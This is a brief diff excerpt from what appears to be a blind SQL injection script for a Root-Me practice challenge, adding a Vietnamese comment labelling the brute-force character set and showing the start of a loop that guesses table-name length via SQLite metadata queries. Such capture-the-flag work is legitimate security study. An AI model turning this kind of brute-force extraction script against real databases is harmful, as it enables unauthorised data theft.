@@ -341,7 +341,7 @@ SELECT name FROM pragma_table_info('{table_name}')
 import requests
 import string
 url="http://challenge01.root-me.org/web-serveur/ch10/"
-LETTERS=string.ascii_lowercase+string.ascii_uppercase+string.digits+'_'
+LETTERS=string.ascii_lowercase+string.ascii_uppercase+string.digits+'_'  #ký tự để brute-force
 
 table_length=0
 for i in range(1,20):
